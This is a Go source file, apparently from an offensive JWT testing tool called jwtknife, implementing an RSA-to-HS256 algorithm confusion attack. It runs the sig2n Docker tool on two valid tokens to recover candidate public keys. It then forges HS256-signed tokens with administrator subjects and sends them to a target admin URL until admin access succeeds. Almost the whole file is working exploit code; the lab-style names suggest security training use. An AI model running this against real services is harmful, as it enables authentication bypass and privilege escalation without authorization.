package jwt

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"os/exec"
	"regexp"
	"strconv"
	"strings"

	"github.com/spencer5cent/jwtknife/internal/httpx"
	"github.com/spencer5cent/jwtknife/internal/jwtknifejwt"
	"github.com/spencer5cent/jwtknife/internal/report"
)

// AlgConfusionSig2NAttack implements the "no exposed key" RSA alg confusion variant.
// It relies on recovering candidate RSA moduli / public keys from TWO valid server-issued JWTs
// via external tooling (sig2n-style), then attempts HS256 confusion using recovered keys.
//
// Note: This is inherently "lab/expert" but the underlying weakness can exist in real apps.
type AlgConfusionSig2NAttack struct{}

func NewAlgConfusionSig2NAttack() Attack { return AlgConfusionSig2NAttack{} }

func (AlgConfusionSig2NAttack) Name() string { return "alg-confusion-sig2n" }

func (AlgConfusionSig2NAttack) Run(in AttackInput) report.AttackResult {
	ar := report.NewAttackResult("alg-confusion-sig2n")

	// Preconditions
	if strings.TrimSpace(in.SecondRawJWT) == "" {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "second JWT not provided (required for sig2n-style attack)"
		return ar
	}
	if !strings.HasPrefix(strings.ToUpper(in.ParsedJWT.Alg), "RS") {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "original token is not RSA-signed"
		return ar
	}
	if _, err := jwtknifejwt.Parse(in.SecondRawJWT); err != nil {
		ar.Outcome = report.OutcomeError
		ar.Errors = append(ar.Errors, "failed to parse second JWT: "+err.Error())
		return ar
	}

	// Execute external sig2n tooling (Docker-based).
	cmd := exec.Command(
		"docker", "run", "--rm", "portswigger/sig2n",
		in.RawJWT,
		in.SecondRawJWT,
	)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		ar.Outcome = report.OutcomeError
		ar.Errors = append(ar.Errors, "sig2n execution failed: "+err.Error())
		if stderr.Len() > 0 {
			ar.Errors = append(ar.Errors, strings.TrimSpace(stderr.String()))
		}
		return ar
	}

	keys := extractX509Keys(stdout.String())
	if len(keys) == 0 {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "sig2n ran but no candidate X.509 keys were extracted"
		return ar
	}

	ar.Outcome = report.OutcomeInteresting
	ar.Note = "sig2n produced candidate keys; attempting HS256 confusion"

	// Conservative set; you can expand later with claim heuristics.
	adminSubjects := []string{"administrator", "admin", "root", "superuser", "carlos"}

	for i, kB64 := range keys {
		// sig2n typically outputs base64 of DER (X.509 / SubjectPublicKeyInfo)
		keyDER, err := base64.StdEncoding.DecodeString(kB64)
		if err != nil {
			// Some outputs are base64url or include whitespace; try url variant too.
			if b2, err2 := base64.RawURLEncoding.DecodeString(kB64); err2 == nil {
				keyDER = b2
			} else {
				continue
			}
		}

		for _, subject := range adminSubjects {
			p, err := jwtknifejwt.Parse(in.RawJWT)
			if err != nil {
				ar.Errors = append(ar.Errors, "failed to parse original JWT: "+err.Error())
				continue
			}

			// Force HS256, escalate subject
			if p.Header == nil {
				p.Header = map[string]any{}
			}
			if p.Payload == nil {
				p.Payload = map[string]any{}
			}
			p.Header["alg"] = "HS256"
			p.Payload["sub"] = subject

			rebuilt, err := jwtknifejwt.Rebuild(p)
			if err != nil {
				ar.Errors = append(ar.Errors, "failed to rebuild JWT: "+err.Error())
				continue
			}

			parts := strings.SplitN(rebuilt, ".", 3)
			if len(parts) < 2 {
				ar.Errors = append(ar.Errors, "failed to rebuild unsigned token")
				continue
			}
			unsigned := parts[0] + "." + parts[1]

			h := hmac.New(sha256.New, keyDER)
			h.Write([]byte(unsigned))
			sig := base64.RawURLEncoding.EncodeToString(h.Sum(nil))
			forged := unsigned + "." + sig

			step := report.Step{
				Label:   "alg-confusion-sig2n",
				Details: "Attempt with recovered X.509 candidate #" + strconv.Itoa(i) + " (sub=" + subject + ")",
				JWT:     report.JWTInfo{Token: forged},
			}

			if in.Client != nil && in.Targets.AdminURL != "" {
				r := in.Client.Do(httpx.RequestPlan{
					Label:     "admin-alg-confusion-sig2n",
					URL:       in.Targets.AdminURL,
					Method:    in.Targets.Method,
					JWT:       forged,
					Placement: in.Targets.Placement,
				})
				step.HTTP = report.FromHTTPResult(r)

				if report.IsAdminSuccess(in.Baseline, step.HTTP) {
					ar.Steps = append(ar.Steps, step)
					ar.Outcome = report.OutcomeSuccess
					ar.Note = "admin access via algorithm confusion with recovered RSA key (sig2n)"
					return ar
				}

				if report.IsInteresting(in.Baseline, step.HTTP) {
					ar.Outcome = report.OutcomeInteresting
				}
			}

			ar.Steps = append(ar.Steps, step)
		}
	}

	return ar
}

// extractX509Keys pulls Base64-encoded X.509 public key blobs from sig2n output.
// We keep it permissive because different builds print slightly different labels.
func extractX509Keys(out string) []string {
	seen := map[string]bool{}
	var keys []string

	lines := strings.Split(out, "\n")

	// Generic "long base64" matcher.
	reB64 := regexp.MustCompile(`([A-Za-z0-9+/=]{120,})`)

	for _, l := range lines {
		s := strings.TrimSpace(l)
		if s == "" {
			continue
		}

		// Prefer lines that look like they reference x509/spki.
		lower := strings.ToLower(s)
		if strings.Contains(lower, "x.509") || strings.Contains(lower, "x509") || strings.Contains(lower, "subjectpublickeyinfo") || strings.Contains(lower, "spki") {
			m := reB64.FindStringSubmatch(s)
			if len(m) == 2 {
				k := m[1]
				if !seen[k] {
					seen[k] = true
					keys = append(keys, k)
				}
				continue
			}
		}

		// Fallback: any very long base64 blob (still deduped)
		m := reB64.FindStringSubmatch(s)
		if len(m) == 2 {
			k := m[1]
			if !seen[k] {
				seen[k] = true
				keys = append(keys, k)
			}
		}
	}

	return keys
}
